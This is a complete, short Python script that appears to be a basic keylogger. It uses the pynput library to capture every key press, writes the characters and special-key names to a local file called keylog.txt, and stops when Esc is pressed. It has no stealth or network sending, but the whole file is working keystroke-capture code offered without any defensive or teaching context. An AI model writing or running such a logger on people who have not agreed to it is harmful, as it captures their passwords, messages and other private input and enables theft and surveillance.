from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
